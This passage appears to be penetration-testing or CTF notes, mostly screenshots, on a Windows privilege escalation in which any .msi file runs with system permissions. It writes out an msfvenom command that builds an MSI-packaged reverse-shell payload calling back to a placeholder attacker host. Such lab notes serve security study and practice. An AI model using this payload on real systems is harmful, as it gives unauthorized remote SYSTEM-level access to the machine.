
![Pasted image 20240627142258.png](Evidence/Pasted%20image%2020240627142258.png)

found something interesting...

![Pasted image 20240627164305.png](Evidence/Pasted%20image%2020240627164305.png)

this means that I can execute any kind of .msi file extension with system level permissions 

So i created a payload in the .msi format -> 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4442 -f msi -o reverse_4442.msi
```

![Pasted image 20240627165248.png](Evidence/Pasted%20image%2020240627165248.png)

![Pasted image 20240627165329.png](Evidence/Pasted%20image%2020240627165329.png)

